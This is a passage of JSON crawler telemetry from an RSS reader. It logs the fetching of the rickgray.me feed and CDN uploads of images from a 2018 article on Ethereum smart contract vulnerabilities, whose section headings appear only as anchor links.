+0000","fetchMs":475,"handleMs":1393,"totalMs":159835,"newArticles":0,"totalArticles":20,"status":1,"type":0,"ip":"259fd9e3ae01f734143a220053069654","hostName":"europe-58*","requestId":"613711477e7b4b13bcd0b8e8881c4d10_31458","contentType":"application/xml","totalBytes":8630900,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":19,"articlesImgsGithubTotal":15,"successGithubMap":{"myreaderx8":1,"myreaderx15":1,"myreaderx27":1,"myreaderx6":1,"myreaderx4":1,"myreaderx10":1,"myreaderx32":1,"myreaderx3":1,"myreaderx33":1,"myreaderx22":1,"myreaderx2":1,"myreaderx12":1,"myreaderx13":1,"myreaderx24":1,"myreaderx5oss":1},"failGithubMap":{"myreaderx14":1}},"feed":{"createdTime":"2020-09-07 02:52:43","updatedTime":"2020-09-07 02:52:43","id":31458,"name":"rickgray.me","url":"http://rickgray.me/atom.xml","subscriber":102,"website":null,"icon":"http://rickgray.me/images/logo.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx63/cdn88@2020_4/2020/09/06/21-00-11-481_83c6c5243fc2e6f7.png","description":"","weekly":null,"link":"http://rickgray.me"},"noPictureArticleList":[{"createdTime":"2020-09-07 05:02:50","updatedTime":"2020-09-07 05:02:50","id":null,"feedId":31458,"linkMd5":"4f7462976023f2a6e0cd00e9a4e557c7"}],"tmpCommonImgCdnBytes":29730,"tmpBodyImgCdnBytes":8601170,"tmpBgImgCdnBytes":0,"extra4":{"start":1599426010491,"total":0,"statList":[{"spend":515,"msg":"获取xml内容"},{"spend":1393,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":152995,"msg":"正文链接上传到cdn"}]},"extra5":19,"extra6":16,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/9.png","sourceStatusCode":200,"destWidth":750,"destHeight":119,"sourceBytes":8022,"destBytes":8038,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":350,"convertSpendMs":9,"createdTime":"2020-09-07 05:00:17","host":"us-001*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn45/contents/2020/09/06/21-00-17-781_faf91bfee5511278.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sun, 06 Sep 2020 21:00:17 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["EA2E:1175:1FAB917:358346B:5F554DD5"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599426441"],"x-ratelimit-used":["61"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn45/contents/2020/09/06/21-00-17-781_faf91bfee5511278.webp","historyStatusCode":[],"spendMs":46},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.8 KB","destSize":"7.8 KB","compressRate":"100.2%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/9.png","sourceStatusCode":200,"destWidth":750,"destHeight":119,"sourceBytes":8022,"destBytes":8038,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":76,"convertSpendMs":18,"createdTime":"2020-09-07 05:00:17","host":"us-001*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn45/contents/2020/09/06/21-00-17-938_faf91bfee5511278.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sun, 06 Sep 2020 21:00:17 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["EA2E:1175:1FAB92F:3583F05:5F554DE1"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599426441"],"x-ratelimit-used":["61"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn45/contents/2020/09/06/21-00-17-938_faf91bfee5511278.webp","historyStatusCode":[],"spendMs":46},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.8 KB","destSize":"7.8 KB","compressRate":"100.2%"},null,null,null,null,null,null,null],"extra10_invalidATagHrefValue":{"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#1-以太坊账户和智能合约区别":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#1-以太坊账户和智能合约区别","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#4-几种转币方法对比":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#4-几种转币方法对比","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#II-漏洞现场还原":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#II-漏洞现场还原","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#3-Arithmetic-Issues":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#3-Arithmetic-Issues","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#5-require-和-assert，revert-与-throw":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#5-require-和-assert，revert-与-throw","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#I-智能合约开发-Solidity":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#I-智能合约开发-Solidity","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#3-回退函数-fallback":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#3-回退函数-fallback","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#9-Short-Address-Attack-短地址攻击":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#9-Short-Address-Attack-短地址攻击","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#4-Unchecked-Return-Values-For-Low-Level-Calls":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#4-Unchecked-Return-Values-For-Low-Level-Calls","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#2-使用-keccak256-进行函数签名时的坑？-参数默认位数标注":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#2-使用-keccak256-进行函数签名时的坑？-参数默认位数标注","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#参考链接：":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#参考链接：","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#6-Bad-Randomness-可预测的随机处理":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#6-Bad-Randomness-可预测的随机处理","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#III-自我思考":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#III-自我思考","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#2-代码执行限制":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#2-代码执行限制","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#1-Reentrancy":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#1-Reentrancy","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#8-Time-Manipulation":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#8-Time-Manipulation","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#7-Front-Running-提前交易":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#7-Front-Running-提前交易","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#1-以太坊中合约账户的私钥在哪？可以不通过合约账户代码直接操作合约账户中的-Ether-吗？":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#1-以太坊中合约账户的私钥在哪？可以不通过合约账户代码直接操作合约账户中的-Ether-吗？","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#5-Denial-of-Service-拒绝服务":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#5-Denial-of-Service-拒绝服务","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#Unknown-Unknowns-其他未知，-未知漏洞，没啥好讲的，为了跟-DASP-保持一致而已":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#Unknown-Unknowns-其他未知，-未知漏洞，没啥好讲的，为了跟-DASP-保持一致而已","http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/_#2-Access-Control":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#2-Access-Control"},"extra111_proxyServerAndStatMap":{"http://us-013.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-032.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-037.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-55.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-021.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-005.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-009.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-60.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-020.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-025.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-001.herokuapp.com/":{"failCount":1,"successCount":2,"resultList":[200,200,null]},"http://us-54.herokuapp.com/":{"failCount":1,"successCount":1,"resultList":[200,null]},"http://us-031.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-017.herokuapp.com/":{"failCount":1,"successCount":1,"resultList":[200,null]},"http://europe64.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-51.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://europe-22.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-029.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/1.png","sourceStatusCode":200,"destWidth":765,"destHeight":430,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn1@2020_2/2020/09/06/21-00-16-393_462ccf494729d41d.webp","sourceBytes":21732,"destBytes":29730,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1224,"convertSpendMs":31,"createdTime":"2020-09-07 05:00:16","host":"us-005*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7,4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"21.2 KB","destSize":"29 KB","compressRate":"136.8%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/8.png","sourceStatusCode":200,"destWidth":750,"destHeight":119,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn42@2020_2/2020/09/06/21-00-17-787_4b2883dc64771194.webp","sourceBytes":7831,"destBytes":8084,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1063,"convertSpendMs":10,"createdTime":"2020-09-07 05:00:17","host":"us-013*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.6 KB","destSize":"7.9 KB","compressRate":"103.2%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/16.png","sourceStatusCode":200,"destWidth":750,"destHeight":255,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn7@2020_6/2020/09/06/21-00-17-879_0468f72ec23992dd.webp","sourceBytes":14333,"destBytes":9206,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1142,"convertSpendMs":9,"createdTime":"2020-09-07 05:00:17","host":"us-031*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"14 KB","destSize":"9 KB","compressRate":"64.2%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/7.png","sourceStatusCode":200,"destWidth":750,"destHeight":364,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn38@2020_5/2020/09/06/21-00-17-801_cc53b744850228c4.webp","sourceBytes":41303,"destBytes":19780,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1196,"convertSpendMs":12,"createdTime":"2020-09-07 05:00:17","host":"us-025*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"40.3 KB","destSize":"19.3 KB","compressRate":"47.9%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/6.png","sourceStatusCode":200,"destWidth":835,"destHeight":220,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn34@2020_2/2020/09/06/21-00-17-869_8fb1019b149ade28.webp","sourceBytes":48523,"destBytes":20656,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1209,"convertSpendMs":11,"createdTime":"2020-09-07 05:00:17","host":"us-037*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"47.4 KB","destSize":"20.2 KB","compressRate":"42.6%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/4.png","sourceStatusCode":200,"destWidth":699,"destHeight":240,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn26@2020_1/2020/09/06/21-00-17-852_d10713a9c1106ed0.webp","sourceBytes":33323,"destBytes":14030,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1497,"convertSpendMs":8,"createdTime":"2020-09-07 05:00:17","host":"europe-22*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"32.5 KB","destSize":"13.7 KB","compressRate":"42.1%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/18.png","sourceStatusCode":200,"destWidth":1920,"destHeight":584,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn21@2020_2/2020/09/06/21-00-17-925_ede35775d27b9687.webp","sourceBytes":558742,"destBytes":77964,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1374,"convertSpendMs":64,"createdTime":"2020-09-07 05:00:17","host":"us-009*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"545.6 KB","destSize":"76.1 KB","compressRate":"14%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/3.png","sourceStatusCode":200,"destWidth":1488,"destHeight":784,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn6@2020_2/2020/09/06/21-00-17-900_c60524383954d423.webp","sourceBytes":110491,"destBytes":91224,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1392,"convertSpendMs":74,"createdTime":"2020-09-07 05:00:17","host":"us-020*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"107.9 KB","destSize":"89.1 KB","compressRate":"82.6%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/15.png","sourceStatusCode":200,"destWidth":1920,"destHeight":940,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn70@2020_4/2020/09/06/21-00-17-892_ca81e106a722ad14.webp","sourceBytes":457528,"destBytes":89052,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1437,"convertSpendMs":109,"createdTime":"2020-09-07 05:00:17","host":"us-54*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"446.8 KB","destSize":"87 KB","compressRate":"19.5%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/17.png","sourceStatusCode":200,"destWidth":862,"destHeight":311,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn16@2020_4/2020/09/06/21-00-18-149_274f157800e006b9.webp","sourceBytes":48455,"destBytes":22342,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1165,"convertSpendMs":14,"createdTime":"2020-09-07 05:00:17","host":"us-021*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"47.3 KB","destSize":"21.8 KB","compressRate":"46.1%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/2.png","sourceStatusCode":200,"destWidth":1488,"destHeight":758,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn10@2020_4/2020/09/06/21-00-18-169_a132cbcdc7859cba.webp","sourceBytes":137676,"destBytes":94288,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1650,"convertSpendMs":375,"createdTime":"2020-09-07 05:00:17","host":"us-032*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"134.4 KB","destSize":"92.1 KB","compressRate":"68.5%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/13.png","sourceStatusCode":200,"destWidth":1488,"destHeight":920,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn61@2020_3/2020/09/06/21-00-18-305_cd034959acf311af.webp","sourceBytes":160647,"destBytes":121666,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1848,"convertSpendMs":82,"createdTime":"2020-09-07 05:00:17","host":"us-017*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"156.9 KB","destSize":"118.8 KB","compressRate":"75.7%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/14.png","sourceStatusCode":200,"destWidth":1488,"destHeight":1226,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn71@2020_1/2020/09/06/21-00-18-508_2f03426988542cbd.webp","sourceBytes":204831,"destBytes":112060,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":1990,"convertSpendMs":619,"createdTime":"2020-09-07 05:00:17","host":"us-55*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"200 KB","destSize":"109.4 KB","compressRate":"54.7%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/19.png","sourceStatusCode":200,"destWidth":1500,"destHeight":580,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn29@2020_6/2020/09/06/21-00-18-067_d7b4f593137fc7a5.webp","sourceBytes":101186,"destBytes":65350,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":2179,"convertSpendMs":91,"createdTime":"2020-09-07 05:00:17","host":"europe-60*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"98.8 KB","destSize":"63.8 KB","compressRate":"64.6%"},{"code":1,"isDone":false,"source":"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/president_of_country_demo.gif","sourceStatusCode":200,"destWidth":1920,"destHeight":1088,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn58@2020_5/2020/09/06/21-02-15-173_032bc354319627b3.webp","sourceBytes":2985678,"destBytes":7855468,"targetWebpQuality":75,"feedId":31458,"totalSpendMs":58549,"convertSpendMs":55977,"createdTime":"2020-09-07 05:01:19","host":"us-031*","referer":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","linkMd5ListStr":"4f7462976023f2a6e0cd00e9a4e557c7","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"2.8 MB","destSize":"7.5 MB","compressRate":"263.1%"}],"successGithubMap":{"myreaderx8":1,"myreaderx15":1,"myreaderx27":1,"myreaderx6":1,"myreaderx4":1,"myreaderx10":1,"myreaderx32":1,"myreaderx3":1,"myreaderx33":1,"myreaderx22":1,"myreaderx2":1,"myreaderx12":1,"myreaderx13":1,"myreaderx24":1,"myreaderx5oss":1},"failGithubMap":{"myreaderx14":1}}